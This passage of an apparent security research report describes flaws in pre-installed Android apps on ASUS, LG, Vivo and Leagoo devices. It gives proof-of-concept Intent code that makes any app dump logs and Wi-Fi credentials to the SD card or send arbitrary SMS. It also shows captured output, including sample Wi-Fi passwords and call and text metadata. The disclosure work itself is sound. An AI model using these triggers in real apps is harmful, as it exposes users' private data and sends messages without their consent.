i2.setClassName("com.asus.loguploader", "com.asus.loguploader.LogUploaderService"); 
startService(i2); 
The source code above will cause the com.asus.loguploader app to write log data to a base directory of 
/sdcard/ASUS/LogUploader. Each time this code is executed, it will overwrite the previous files. A listing 
of the files in the most relevant directory (i.e., /sdcard/ASUS/LogUploader/general/sdcard) is provided 
below. 
ASUS_X008_1:/sdcard/ASUS/LogUploader/general/sdcard $ ls -alh 
total 9.4M 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
drwxrwx--x 5 root sdcard_rw 4.0K 2018-05-20 13:32 . 
drwxrwx--x 3 root sdcard_rw 4.0K 2018-05-20 13:32 .. 
drwxrwx--x 2 root sdcard_rw 4.0K 2018-05-20 13:32 anr 
-rwxrwx--x 1 root sdcard_rw  817 2018-05-20 13:32 df.txt 
-rw-rw---- 1 root sdcard_rw 9.3M 2018-05-20 13:32 dumpstate.txt 
-rwxrwx--x 1 root sdcard_rw 1.2K 2018-05-20 13:32 ls_data_anr.txt 
-rwxrwx--x 1 root sdcard_rw  218 2018-05-20 13:32 ls_data_tombstones.txt 
-rwxrwx--x 1 root sdcard_rw  902 2018-05-20 13:32 ls_wifi_asus_log.txt 
drwxrwx--x 2 root sdcard_rw 4.0K 2018-05-20 13:32 mtklog 
-rwxrwx--x 1 root sdcard_rw  474 2018-05-20 13:32 p2p_supplicant.conf 
drwxrwx--x 2 root sdcard_rw 4.0K 2018-05-20 13:32 tombstones 
-rwxrwx--x 1 root sdcard_rw  791 2018-05-20 13:32 wpa_supplicant.conf 
The 
two 
most 
interesting 
files 
are 
dumpstate.txt 
and 
wpa_supplicant.conf. 
The 
wpa_supplicant.conf file is a copy of the /data/misc/wifi/wpa_supplicant.conf file. The 
wpa_supplicant.conf contains the SSID and password for each network that the device has saved. The 
contents of the wpa_supplicant.conf file are shown below. Some of the data below has been changed 
about the networks for privacy reasons. 
ASUS_X008_1:/sdcard/ASUS/LogUploader/general/sdcard $ cat wpa_supplicant.conf                 
ctrl_interface=/data/misc/wifi/sockets 
driver_param=use_p2p_group_interface=1 
update_config=1 
device_name=US_Phone 
manufacturer=asus 
model_name=ASUS_X008DC 
model_number=ASUS_X008DC 
serial_number=H4AXGY012345DMV 
device_type=10-0050F204-5 
os_version=01020300 
config_methods=physical_display virtual_push_button 
p2p_no_group_iface=1 
external_sim=1 
wowlan_triggers=disconnect 
network={ 
ssid="HOME-NET" 
bssid=cc:35:40:b8:7c:e2 
psk="5GgMK*-Aa828" 
key_mgmt=WPA-PSK 
disabled=1 
id_str="%7B%22creatorUid%22%3A%221000%22%2C%22configKey%22%3A%22%5C%22HOME-
NET%5C%22WPA_PSK%22%7D" 
} 
network={ 
ssid="Huba" 
bssid=ac:22:0b:df:15:d8 
psk="2Vk69c9a*ze2" 
key_mgmt=WPA-PSK 
disabled=1 
id_str="%7B%22creatorUid%22%3A%221000%22%2C%22configKey%22%3A%22%5C%Huba%5C%22W
PA_PSK%22%7D" 
} 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
The dumpstate.txt file is the result of running the dumpstate command27. This is essentially a dump 
containing the logcat log, kernel log, a dump of system services, and more. The generated dumpstate.txt 
file from the listing of files above is 9.3MB. Notably, the text of the active notifications is contained in the 
file. The active notifications from the dumpstate.txt file are provided in Appendix C. The logcat log is 
contained within the dumpstate.txt file. Telephony meta-data for text messages and phone calls appear 
in the logcat log. Below are some examples that we have identified, although there may be additional log 
messages that can appear. 
Placing a call (log message written by the system_server process whenever the user makes a call) 
05-22 12:44:02.283  1185  1185 D Telecom : CallIntentProcessor: 
processOutgoingCallIntent(): uriString = 7035551234: PCR.oR@AX0 
Receiving a call (log message written by the com.android.phone process whenever there in an incoming 
call) 
05-22 12:47:36.883  1823  1823 D TelecomFramework: TelephonyConnectionService: 
createConnection, callManagerAccount: PhoneAccountHandle{TelephonyConnectionService, 
8901260145725529100f, UserHandle{0}}, callId: TC@2, request: ConnectionRequest 
tel:17035551234 Bundle[mParcelledData.dataSize=584], isIncoming: true, isUnknown: 
false 
Sending a text message (log message written by the android.process.acore process whenever a text 
message is sent) 
05-22 13:05:30.713  9110  9121 V ContactsProvider: query: 
uri=content://com.android.contacts/data/phones  projection=[contact_id, _id]  
selection=[data1 IN (?)]  args=[7035551234]  order=[null] CPID=3064 User=0 
Receiving a text message 
Receiving a text message (log message written by the com.android.phone process whenever a text 
message is received) 
05-22 13:08:41.014  1823  3972 D Mms/Provider/MmsSms: query begin, uri = 
content://mms-sms/threadID?recipient=%2B17035551234, selection = null 
05-22 13:08:41.017  1823  3972 D Mms/Provider/MmsSms: getAddressIds: get exist id=5, 
refinedAddress=+17035551234, currentNumber=7035551234 
5.4 LG G6 & LG Q6 – Dumping the Logcat Logs and Kernel Logs to External Storage 
The com.lge.mlt app (versionCode=60000002, versionName=6.0.2) is present as a pre-installed app 
on two LG devices we examined, show below with the corresponding build fingerprints. 
LG G6 - lge/lucye_nao_us_nr/lucye:7.0/NRD90U/17355125006e7:user/release-keys 
LG Q6 - lge/mhn_lao_com_nr/mhn:7.1.1/NMF26X/173421645aa48:user/release-keys 
27 https://source.android.com/setup/contribute/read-bug-reports 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
The pre-installed com.lge.mlt app (versionCode=60000002, versionName=6.0.2) will dump an 
SQLite database to external storage (i.e., SD card) containing a large amount of data including snippets of 
the logcat log and kernel log when it receives a broadcast intent with a specific action string that can be sent 
by any app on the device. The file that the app created on our device was 3.8 MB. The com.lge.mlt app 
has a broadcast receiver named com.lge.mlt.hiddenmenu.MptHiddenMenuReceiver. This receiver 
statically 
registers 
to 
receive 
broadcast 
intents 
that 
have 
an 
action 
string 
of 
com.lge.mlt.copy.hiddendatabase. Below is a snippet of the AndroidManifest.xml file of the 
com.lge.mlt app. 
        E: receiver (line=52) 
          A: android:name(0x01010003)="com.lge.mlt.hiddenmenu.MptHiddenMenuReceiver" (Raw: 
"com.lge.mlt.hiddenmenu.MptHiddenMenuReceiver") 
          E: intent-filter (line=53) 
            E: action (line=54) 
              A: android:name(0x01010003)="MPT.GO_TO_HIDDEN_MENU" (Raw: 
"MPT.GO_TO_HIDDEN_MENU") 
            E: action (line=55) 
              A: android:name(0x01010003)="com.lge.mlt.copy.hiddendatabase" (Raw: 
"com.lge.mlt.copy.hiddendatabase")     
When the MptHiddenMenuReceiver broadcast receiver receives a broadcast intent with an action string of 
com.lge.mlt.copy.hiddendatabase, it will copy a database with a path of /mpt/LDB_MainData.db to 
a path of /sdcard/ldb/_data.ez. In addition, on the LG G6 device, a file named a file named 
/mpt/serial is copied to a path of /sdcard/ldb/_index.ez and the file contains the IMEI of the 
device. This app appears to store crash logs and other diagnostic data. The End-User License Agreement 
(EULA) for the com.lge.mlt app says that the data may contain “application use history, IMEI, country, 
language, serial number, model, screen resolution, OS information, reception strength, network location 
information, and service and connection status.” Any app on the device that has been granted the 
READ_EXTERNAL_STORAGE permission can cause the com.lge.mlt app to write this database to the SD 
card and then mine it for personal data. In the _data.ez file, the table named t320 contains log entries 
from the kernel log and the logcat log. 
5.5 Vivo V7 – Dumping the Logcat Logs to External Storage 
The Vivo V7 device contains an app with a package name of com.vivo.bsptest (versionCode=1, 
versionName=1.0). This app will initiate the writing of the logcat log and kernel log to external storage 
with a default path of /sdcard/bbklog once it receives an intent that can be sent by any app on the device. 
The writing of the logs is not totally transparent to the user. Once a third-party app sends an intent to the 
com.vivo.bsptest app, a sticky notification appears in the status bar that “Log Collection – Logs are 
running.” The user can click the notification and cancel the collection of logs. The source code below will 
start the com.vivo.bsptest.BSPTestActivity activity app component (which activates the logging) with 
a flag which will hide it from the recent apps, wait 0.5 seconds, and then returns to the main launcher screen.  
Intent i = new Intent(); 
i.setClassName("com.vivo.bsptest", "com.vivo.bsptest.BSPTestActivity"); 
i.setFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS); 
startActivity(i); 
try { 
    Thread.sleep(500); 
} catch (InterruptedException e) { 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
    e.printStackTrace(); 
} 
Intent i2 = new Intent("android.intent.action.MAIN"); 
i2.addCategory(Intent.CATEGORY_HOME); 
startActivity(i2); 
The Vivo V7 device can also be made to write the coordinates of screen presses to the logcat log as detailed 
in Section 9.1. 
6. Exposing Telephony Data and Capabilities 
We discovered that the Leagoo Z5C device allows any app co-located on the device to send arbitrary text 
messages. In addition, it allows any app on the device to obtain the most recent text message in each 
conversation via an exported content provider. We found that three devices sold by T-Mobile contained a 
Rich Communication Services (RCS) app that allows the sending of arbitrary text messages, allows the 
user’s text messages to be read and modified, and provides the phone numbers of the user’s contacts. This 
RCS app has also been refactored with a second package name that has essentially the same behavior.  
6.1 Leagoo Z5C – Custom com.android.messaging App 
We examined a Leagoo Z5C Android device, and we noticed some additional behavior that is not present  
in Google’s version of the com.android.messaging app. The Leagoo Z5C had a build fingerprint of  
sp7731c_1h10_32v4_bird:6.0/MRA58K/android.20170629.214736:user/release-keys. 
6.1.1 Leagoo Z5C – Sending Arbitrary Text Messages 
Any app on the device can send an intent to an exported broadcast receiver application component that will 
result in the sending of a text message where the phone number and body of the text message is controlled 
by the attacker. This can be accomplished by a zero-permission third-party app. The 
com.android.messaging 
app 
(versionCode=1000110, 
versionName=1.0.001, 
(android.20170630.092853-0)) 
contains 
an 
exported 
broadcast 
receiver 
named 
com.android.messaging.trackersender.TrackerSender, 
and 
its 
declaration 
in 
the 
AndroidManifest.xml file is provided below. The TrackerSender component is explicitly exported. 
The 
TrackerSender 
component 
registers 
for 
the 
com.sprd.mms.transaction.TrackerSender.SEND_SMS_ACTION action. When this component receives 
an intent with a specific action and has the appropriate data embedded in an intent, it will extract the data 
from the intent and send a text message using the android.telephony.SmsManager API. Below is the 
source code to make the TrackerSender component send a text message. 
Intent i = new Intent(); 
i.setAction("com.sprd.mms.transaction.TrackerSender.SEND_SMS_ACTION"); 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
i.putExtra("message_body", "Huba"); 
i.putExtra("message_recipient", "+1703555555"); 
i.putExtra("message_falg_retry", true); 
i.putExtra("message_phone_id", 1); 
i.putExtra("message_token", (long) 1234); 
sendBroadcast(i); 
6.1.2 Leagoo Z5C – Obtaining the Most Recent Text Message from each Conversation 
Due to an exported broadcast receiver, a zero-permission third-party app can query the most recent text 
message from each conversation. That is, for each phone number where the user has either texted or received 
a text from, a zero-permission third party app can obtain the body of the text message, phone number, name 
of the contact (if it exists), and a timestamp. The com.android.messaging app (versionCode=1000110, 
versionName=1.0.001, (android.20170630.092853-0)) contains an exported content provider with a 
name of com.android.messaging.datamodel.MessagingContentProvider. Below is the content 
provider being declared in the com.android.messaging app’s AndroidManifest.xml file. 
As the querying of the content provider can be performed silently in the background, it can be continuously 
monitored to check to see if the current message in each conversation has changed and record any new 
messages. To query the most recent text message for each conversation, the app simply needs to query a 
content 
provider 
in 
the 
standard 
way 